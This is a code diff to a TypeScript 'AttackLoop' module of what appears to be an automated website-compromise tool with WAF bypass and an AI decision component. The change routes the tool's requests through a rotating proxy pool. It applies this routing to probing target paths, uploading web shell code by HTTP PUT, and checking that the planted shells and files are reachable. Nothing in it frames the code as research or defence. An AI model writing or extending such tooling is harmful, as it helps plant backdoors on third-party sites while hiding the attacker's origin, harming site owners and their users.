@@ -13,6 +13,7 @@
 //  - SSE streaming for real-time progress
 // ═══════════════════════════════════════════════════════════════
 
+import { fetchWithPoolProxy } from "./proxy-pool";
 import {
   oneClickDeploy,
   parseProxyList,
@@ -32,6 +33,19 @@ import {
 import { stealthVerifyBatch, stealthBypassWaf, closeBrowser, isBrowserAvailable } from "./stealth-browser";
 import { invokeLLM } from "./_core/llm";
 import { AIAutonomousBrain, type AIStrategy, type AIDecision } from "./ai-autonomous-brain";
+
+// Helper: wrap fetch with proxy pool
+async function autoFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  try {
+    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+    return response;
+  } catch (e) {
+    // Fallback to direct fetch if proxy fails
+    return fetch(url, init);
+  }
+}
+
 
 // ─── Types ───
 
@@ -369,7 +383,7 @@ export class AttackLoop {
 
     for (const path of commonPaths) {
       try {
-        const resp = await fetch(`${this.config.targetUrl}${path}`, {
+        const resp = await autoFetch(`${this.config.targetUrl}${path}`, {
           method: "HEAD",
           signal: AbortSignal.timeout(5000),
           redirect: "follow",
@@ -869,7 +883,7 @@ export class AttackLoop {
               if (this.stopped || overallSuccess) break;
               try {
                 const uploadUrl = `${this.config.targetUrl}${path}${shell.filename}`;
-                const resp = await fetch(uploadUrl, {
+                const resp = await autoFetch(uploadUrl, {
                   method: "PUT",
                   body: shell.code,
                   headers: {
@@ -881,7 +895,7 @@ export class AttackLoop {
 
                 if (resp.ok || resp.status === 201) {
                   // Verify the file is accessible
-                  const verifyResp = await fetch(uploadUrl, {
+                  const verifyResp = await autoFetch(uploadUrl, {
                     method: "HEAD",
                     signal: AbortSignal.timeout(8000),
                   });
@@ -964,7 +978,7 @@ export class AttackLoop {
     // Verify shell URLs
     for (const url of this.world.state.shellUrls) {
       try {
-        const resp = await fetch(url, {
+        const resp = await autoFetch(url, {
           method: "GET",
           signal: AbortSignal.timeout(10000),
           redirect: "follow",
@@ -984,7 +998,7 @@ export class AttackLoop {
     for (const url of this.world.state.deployedFiles) {
       if (verified.includes(url)) continue;
       try {
-        const resp = await fetch(url, {
+        const resp = await autoFetch(url, {
           method: "HEAD",
           signal: AbortSignal.timeout(10000),
           redirect: "follow",
